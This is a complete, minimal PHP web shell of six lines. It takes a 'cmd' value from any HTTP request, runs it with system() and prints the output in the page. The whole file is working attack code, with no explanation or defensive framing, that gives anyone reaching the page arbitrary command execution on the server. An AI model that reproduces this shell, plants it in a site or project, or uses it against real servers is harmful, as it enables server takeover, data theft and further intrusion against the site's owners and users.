<?php
$cmd = $_REQUEST['cmd'];
echo "<pre><div align=\"left\">";
system($cmd);
echo "</div></pre>";
?>